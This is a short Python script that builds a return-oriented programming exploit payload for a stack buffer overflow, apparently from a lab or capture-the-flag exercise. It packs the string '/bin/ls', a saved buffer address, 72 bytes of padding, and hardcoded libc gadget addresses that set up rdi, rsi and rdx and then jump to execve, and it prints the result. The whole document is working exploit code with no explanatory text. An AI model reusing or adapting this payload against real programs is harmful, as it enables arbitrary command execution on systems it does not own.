BINLS = "\x2f\x62\x69\x6e\x2f\x6c\x73\x00"
LIBC_ADDR = 0x7ffff6ec5000
RDI_OFFSET = 0x13ef4f
RSI_OFFSET = 0x137880
RDX_OFFSET = 0x1b96
EXECVE_OFFSET = 0xcc770
BUFFER_ADDR = "\xd0\xdd\xff\xff\xff\x7f\x00\x00"
BUFFER_ADDR_STORE = "\xd8\xdd\xff\xff\xff\x7f\x00\x00"
RDI_GADGET_ADDR = "\x4f\x3f\x00\xf7\xff\x7f\x00\x00"
RSI_GADGET_ADDR = "\x80\xc8\xff\xf6\xff\x7f\x00\x00"
RDX_GADGET_ADDR = "\x96\x6b\xec\xf6\xff\x7f\x00\x00"
EXECVE_ADDR = "\x70\x17\xf9\xf6\xff\x7f\x00\x00"
NULL = "\x00\x00\x00\x00\x00\x00\x00\x00";

payload = BINLS + BUFFER_ADDR + "\x00"*72 + RDI_GADGET_ADDR + BUFFER_ADDR + RSI_GADGET_ADDR + BUFFER_ADDR_STORE + RDX_GADGET_ADDR + NULL + EXECVE_ADDR

print(payload)